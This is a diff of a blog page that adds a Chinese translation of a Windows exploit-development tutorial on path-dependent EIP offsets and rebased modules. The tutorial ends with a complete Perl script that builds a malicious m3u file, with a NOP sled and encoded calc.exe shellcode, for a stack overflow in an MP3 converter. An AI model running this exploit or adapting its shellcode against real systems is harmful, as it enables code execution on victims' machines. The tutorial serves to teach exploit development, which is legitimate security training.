@@ -42,7 +42,7 @@
   </script>
 
 
-  <title> We are the BOAR ! // Th3 B04r </title>
+  <title> Windows Exploit Development —— 第三部分 // Th3 B04r </title>
 </head>
 
 <body>
@@ -129,7 +129,7 @@
           
           
             
-              We are the BOAR !
+              Windows Exploit Development —— 第三部分
             
           
         </h1>
@@ -138,7 +138,7 @@
       <div class="post-meta">
         <span class="post-time">
           
-            发表于 2015-03-18
+            发表于 2015-03-23
           
         </span>
         
@@ -154,7 +154,116 @@
         
 
         
-          <h1 id="野猪团队">野猪团队</h1><p>几个信息安全从业者利用业余时间组织起来的团队。<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/311ab6a02c00e57e0881f96e63c6673a.jpg" alt="logo"> </p>
+          <p>原文地址: <a href="http://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/" target="_blank" rel="external">http://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/</a><br><a id="more"></a> </p>
+<h1 id="Windows_漏洞利用程序开发之改变偏移地址和重定向模块">Windows 漏洞利用程序开发之改变偏移地址和重定向模块</h1><p>在Part2中，我们构造了一个基本的栈溢出。在那篇中我说过，Exp还远远不够完美。成功覆盖EIP受到了文件路径的影响。此外，虽然Jump/Call地址在应用模块优先了，程序中使用的DLL却是被Rebased的，这意味着我们的CALL EBX指令会改变地址。在这篇中我们将仔细来看看这些问题，看有哪些方法能提供我们的原来Exp使其更兼容稳定</p>
+<h2 id="改变EIP偏移">改变EIP偏移</h2><p>在Part2中我高调提高一个使其，就是EXP仅仅只会在m3u文件放在C盘根目录下时，EIP才会被覆盖，因为偏移到EIP覆盖是依赖文件路径的。如果你想验证以下，试着逸动m3u到桌面，然后重新在ImDbg中加载Exp。你会看到如下截图 —— 你应该看到了同样的入口错误和熟悉的栈入口。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/768d200f1db41233e6a894bee66957ec.png" alt=""> </p>
+<p>如你所见，用CALL EBX替换开始的部分，EIP现在被之前的垃圾代码重写了（就是我们弄的一些A \x41）。一旦长文件路径没有被正确写入Payload，它将Push一切东西到右边，并且改变我们的EIP偏移。要写一个证明（proof-of-concept）可能不是难事儿（只要我们有能力让它在某个地址利用成功）。然而，如果你想进行一个渗透测试或者软件安全测试的话，还需要把难度提高到一个可利用的漏洞，其效果经常受到实战环境的影响。显而易见的是，一个漏洞，只能从一个位置上的文件系统的触发下实现的可能性比一个可以利用从多个位置的可能性低得多。因为地址的这个原因，我们能够修改Exp来包含多种地址利用的可能性，由此提升其执行成功的可能性。</p>
+<p>如果你recall，我们的最终完成的Exp看起来是这样的：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/c422ec39205a0477875d3d5cf5c73b86.png" alt=""><br>EIP偏移（当m3u在C盘根目录的时候）是26121字节。当我们移动m3u到桌面目录，一个更长的文件路径会盗跖EIP覆盖点往左边移动到了垃圾代码的部分（一堆A的地方），因此减小偏移的大小。好的地方是如果文件路径只影响了偏移，我们还是能够提前预判正确新偏移位置的。让我们选一个不同的m3u保存路径来验证我们的理论。全路径的m3u放到桌面既是下面的路径中（和前面路径不同部分用高亮标出）</p>
+<p>C:<strong> \Documents and Settings\Administrator\Desktop\ </strong> asx2mp3.m3u. </p>
+<p>新的路径有45个字符长，其意味着我们需要调整EIP到 -45，所以得到的新的地址是26076。让我们更新下我们的Exp代码，看看到底起作用没有（仅仅只更改Part2中代码的偏移变量）</p>
+<h2 id="Rebased_程序模块">Rebased 程序模块</h2><p>在重启后的Windows机器运行我们的Exp，结果如下：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/00584b2d7c0e9899d63391e8e2b50daf.png" alt=""><br>EIP确实被覆盖到了我们选择的CALL EBX地址（0x01C27228位于MSA2Mcodec00.dll中），但是程序好像没识别位一个有效地址。我已经误入歧途了，因为在我之前的代码中，我从“rebased”的程序模块挑了一个地址来用。因为对rebasing没有过多的了解，简单的理解每个模块都会指派一个基址在其要载入的时候（编译时，通常有一个默认地址来关联所有模块）。如果这里有一个地址在载入时混乱了，操作系统一定会rebase其中的一个模块（执行消耗非常之大）。或者，一个开发者也许会在一开始就rebase一个模块来避免这类问题。在我们的例子中，如果MSA2Mcodec00.dll被rebased了，地址空间改变且像结果一样，我们的CALL EBX地址也改变了。不幸的是，这影响了Exp执行成功率，说呢之超过了找EIP偏移的问题。这里我们有两种选择 —— 1)看看如果我们能够找到其他程序模块不受rebasing影响的（首选方案） 2)使用一个系统模块，记得在Part2中，使用一个系统DLL（对比应用DLL）的缺点么？哪就是减少Exp在不同系统版本（包括语言）的成功率。也就是说，一个Exp工作在每一个Windows XP上比只对一台机器有用！我们能够使用mona插件来确定载入模块有多相近，并且看看哪个对rebasing有效，如下语法：</p>
+<p><em>!mona find -type instr -s “call ebx”</em></p>
+<p>下面是一个找到的结果文件find.txt的截图。它显示了所有call ebx调用的模块，同时判读这些模块是不是受rebaseing的影响（注意rebase那一栏）。别关注其他的列，我已经高亮了所有程序模块rebase属性的值。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5643e2a17b0de00f9b5aec81a33e66a6.png" alt=""> </p>
+<p>注意在这两栏是false的地方（橙色高亮部分）。不幸的是，所有的“Call EBx”地址都是在这些模块中，且包含了空字符，像你在part2中遇到过的那样，有它自己一系列问题。它看起来像我们已经没选择了，只能用系统模块了。我将会从Shell32、User32、Kernel32和Ntdll中选择一个出来，他们也许在各个操作系统之间改动不是很大。使劲儿往下翻，你可以看到真正的“CALL EBX”地址被找到了。我将首先选择Shell32列出来的地址（0x7C9F38F6）</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/4de7e9c318f83778fb38dcbbaaa3415c.png" alt=""> </p>
+<p>现在，我将更新以下Exp代码，用Shell32中找到的新地址来替换CALL EBX（注意已经更新了EIP偏移），创建m3u文件，并且跑起来测试。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5c7becba60d2cc7949734ac12b260f33.png" alt=""> </p>
+<p>成功啦～～</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/5d84cc801853cdb59b3d4e0dce16aba3.png" alt=""> </p>
+<h2 id="更新Exp代码来支持多偏移方式">更新Exp代码来支持多偏移方式</h2><p>OK，所以我们已经搞定了地址rebasing的问题，通过选择系统模块来验证偏移是可以提权通过m3u文件路径长度计算出来的。下一步就是增强位多偏移方式到我们的Exp代码中了，主要是要使其在各种路径都执行成功。其相当偶尔的情况下才会放到C盘根目录或者桌面目录下，所以我们要做一个比较智能的方式来替换偏移（就是计算下路径）。我们能够手工来实现它，通过计算每个文件路径的长度，同时再计算每个偏移地址，如下所示：<br><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/64a281675a6c5901d679193d0872d46f.png" alt=""> </p>
+<p>这就是技术上的活儿了，最后我们构造一个这样的缓冲区，如下：</p>
+<p><em>JUNK (A’s) + EIP + JUNK (A’s) + EIP + JUNK (As) + EIP … + NOPS + SHELLCODE + FILL</em></p>
+<p>当然，这并不是非常有效率的编码方式，和删除路径，所以让我们来做一些有效的脚本来让其容易管理一点儿。<br>首先，我们会创建一堆路径的数组。我已经写了几个可能的路径了，尽管还可能有更多：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/2d90a125c94a6c5365ce42094034f138.png" alt=""> </p>
+<p>同时我也写入了所有手工计算的地址（注释的地方）用来作为解释性的东西，尽管通过脚本创建的偏移我们不需要真正的为每一个路径来做。接下来，我们创建一个循环然后动态的构造Junk + eip数组来填充我们的缓冲区。</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/1ccd7fd97d2002ffdc33c5be8b57dcc5.png" alt=""> </p>
+<p>如下所看到的，我们仅仅知识循环了数组，并且用每个路径的长度（最小的是C:\）来替换我们的偏移地址。<br>最终Exp代码：</p>
+<pre><code><span class="comment">#!/usr/bin/perl</span>
+
+ my $buffsize = <span class="number">50000</span>; <span class="comment"># sets buffer size for consistent sized payload</span>
+
+<span class="comment"># the application incorporates the path of the m3u file in the buffer</span>
+<span class="comment"># this can hinder successful execution by changing the offset to eip</span>
+<span class="comment"># to make this more reliable, we'll create a buffer w/ several offsets</span>
+<span class="comment"># to potential file locations (desktop, my music, my playlists, etc)</span>
+<span class="comment"># if the m3u file is placed in any of these locations it should work</span>
+
+<span class="comment"># if the m3u file is saved in root dir (c:\, z:\, etc) eip offset = 26121</span>
+<span class="comment"># we can use that value to calculate other relative offsets based on file path length</span>
+
+my @offsets = ( 'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">Administrator</span>\<span class="type">My</span> <span class="type">Documents</span>\<span class="type">My</span> <span class="type">Music</span>\<span class="type">My</span> <span class="type">Playlists</span>\\', <span class="comment"># offset at 26049</span>
+'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">All</span> <span class="type">Users</span>\<span class="type">Documents</span>\<span class="type">My</span> <span class="type">Music</span>\<span class="type">My</span> <span class="type">Playlists</span>\\', <span class="comment"># offset at 26056</span>
+'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">Administrator</span>\<span class="type">My</span> <span class="type">Documents</span>\<span class="type">My</span> <span class="type">Music</span>\\', <span class="comment"># offset at 26062</span>
+'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">All</span> <span class="type">Users</span>\<span class="type">Documents</span>\<span class="type">My</span> <span class="type">Music</span>\\', <span class="comment"># offset at 26069</span>
+'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">Administrator</span>\<span class="type">Desktop</span>\\', <span class="comment"># offset at 26076</span>
+'C:\<span class="type">Documents</span> <span class="keyword">and</span> <span class="type">Settings</span>\<span class="type">All</span> <span class="type">Users</span>\<span class="type">Desktop</span>\\', <span class="comment"># offset at 26080</span>
+'C:\\'); <span class="comment"># offset at 26121</span>
+
+my $eip = pack('V', <span class="number">0x7c9f38f6</span>); <span class="comment"># call ebp C:\Windows\System32\SHELL32.dll</span>
+
+$i = <span class="number">0</span>;
+foreach (@offsets) {
+   $curr_offset = <span class="number">26121</span> - (length($_)) + <span class="number">3</span>; <span class="comment"># +3 for shared "c:\"</span>
+   $prev_offset = <span class="number">26121</span> - (length($offsets[$i-<span class="number">1</span>])) + <span class="number">3</span>;
+
+   <span class="keyword">if</span> ($i eq <span class="number">0</span>){  
+      <span class="comment"># if it's the first offset build the junk buffer from 0</span>
+      $junk = <span class="string">"\x41"</span> x $curr_offset;
+      <span class="comment"># append the eip overwrite to the first offset</span>
+      $offset = $junk.$eip  
+   } <span class="keyword">else</span> {
+      <span class="comment"># build a junk buffer relative to the last offset</span>
+      $junk = <span class="string">"\x41"</span> x (($curr_offset - $prev_offset) - <span class="number">4</span>);
+      <span class="comment"># append new junk buffer + eip to the previously constructed offset</span>
+      $offset = $offset.$junk.$eip;
+   }
+
+   $i = $i + <span class="number">1</span>; <span class="comment"># increment index counter</span>
+
+}
+
+my $nops = <span class="string">"\x90"</span> x <span class="number">21400</span>; <span class="comment"># offset to shellcode at call ebp</span>
+
+<span class="comment"># Calc.exe payload [size 227]</span>
+<span class="comment"># msfpayload windows/exec CMD=calc.exe R |</span>
+<span class="comment"># msfencode -e x86/shikata_ga_nai -c 1 -b '\x00\x0a\x0d\xff'</span>
+my $shell = <span class="string">"\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9"</span> .
+<span class="string">"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92"</span> .
+<span class="string">"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84"</span> .
+<span class="string">"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e"</span> .
+<span class="string">"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1"</span> .
+<span class="string">"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27"</span> .
+<span class="string">"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb"</span> .
+<span class="string">"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b"</span> .
+<span class="string">"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2"</span> .
+<span class="string">"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37"</span> .
+<span class="string">"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3"</span> .
+<span class="string">"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef"</span> .
+<span class="string">"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb"</span> .
+<span class="string">"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf"</span> .
+<span class="string">"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83"</span> .
+<span class="string">"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3"</span> .
+<span class="string">"\x9a\xca\xc0"</span>;
+
+my $sploit = $offset.$nops.$shell;
+my $fill = <span class="string">"\x43"</span> x ($buffsize - (length($sploit))); <span class="comment"># fill remainder</span>
+my $buffer = $sploit.$fill; <span class="comment"># build final buffer</span>
+
+<span class="comment"># write the exploit buffer to file</span>
+my $file = <span class="string">"asx2mp3.m3u"</span>;
+open(<span class="type">FILE</span>, <span class="string">"&gt;$file"</span>);
+print <span class="type">FILE</span> $buffer;
+close(<span class="type">FILE</span>);
+print <span class="string">"Exploit file created ["</span> . $file . <span class="string">"]\n"</span>;
+print <span class="string">"Buffer size: "</span> . length($buffer) . <span class="string">"\n"</span>; 
+</code></pre><p>如果你想虚拟化以下缓冲区是啥样的，你只要用文本编辑器（来个Hex不是更帅对比起来）就能看到如下的东西了：</p>
+<p><img src="http://7xi5a7.com1.z0.glb.clouddn.com/upload/05226f8fb69af257943f07aa5a9f2c9f.png" alt=""> </p>
+<p>尽管这次Exp的代码也没用特别完美，因为我们使用了一个系统的DLL来搞EIP覆盖，并且限制了Exp触发位置的数量，但是其已经是Part2的原始版本牛逼很多倍了。</p>
+<p>我应该提醒的就是，除了文件路径会影响偏移外，这里没有任何共性可言的会看到一个可以有多种偏移触发的漏洞。举一个例子，最近的flash漏洞（<a href="http://www.exploit-db.com/exploits/30468/），这个就有两个EIP覆盖点" target="_blank" rel="external">http://www.exploit-db.com/exploits/30468/），这个就有两个EIP覆盖点</a> —— 一个是.rmp文件执行运行的时候，另一个是当它随着程序打开的时候。如果Exp代码自身看起来有些不同，是因为它一个给予SEH缓冲区溢出的漏洞，这个主题我们还会在以后文章中深入。到现在为止，如果你选择了尝试测试以下Exp，你也许需要做一些小的跳转，这取决于你用啥系统。如果你正跑着Windows XP SP3的话，你也许需要使得$junk2的偏移加到10515，并且得看是装了哪个版本的RealPlayer，你也许还需要调整SEH的值。</p>
+<p>当然，这些都仅仅知识一些本地溢出的例子，也给了个提示，当自身受到攻击的时候，你会怎么去解决这个问题。</p>
+<h2 id="结论">结论</h2><p>额，没啥～</p>
 
         
       </div>
@@ -168,11 +277,13 @@
           <div class="post-nav">
             <div class="post-nav-prev post-nav-item">
               
-                <a href="/2015/03/18/about-the-blog/">关于这个Blog</a>
+                <a href="/2015/03/24/windows-exp-dev-part4/">Windows Exploit Development —— 第四部分</a>
               
             </div>
 
             <div class="post-nav-next post-nav-item">
+              
+                <a href="/2015/03/20/windows-exp-dev-part2/">Windows Exploit Development —— 第二部分 栈溢出</a>
               
             </div>
           </div>
@@ -268,7 +379,7 @@
       <div class="post-toc-wrap sidebar-panel-active">
         <div class="post-toc-indicator-top post-toc-indicator"></div>
         <div class="post-toc">
-          <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#野猪团队"><span class="nav-number">1.</span> <span class="nav-text">野猪团队</span></a></li></ol>
+          <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows_漏洞利用程序开发之改变偏移地址和重定向模块"><span class="nav-number">1.</span> <span class="nav-text">Windows 漏洞利用程序开发之改变偏移地址和重定向模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#改变EIP偏移"><span class="nav-number">1.1.</span> <span class="nav-text">改变EIP偏移</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Rebased_程序模块"><span class="nav-number">1.2.</span> <span class="nav-text">Rebased 程序模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#更新Exp代码来支持多偏移方式"><span class="nav-number">1.3.</span> <span class="nav-text">更新Exp代码来支持多偏移方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结论"><span class="nav-number">1.4.</span> <span class="nav-text">结论</span></a></li></ol></li></ol>
         </div>
         <div class="post-toc-indicator-bottom post-toc-indicator"></div>
       </div>
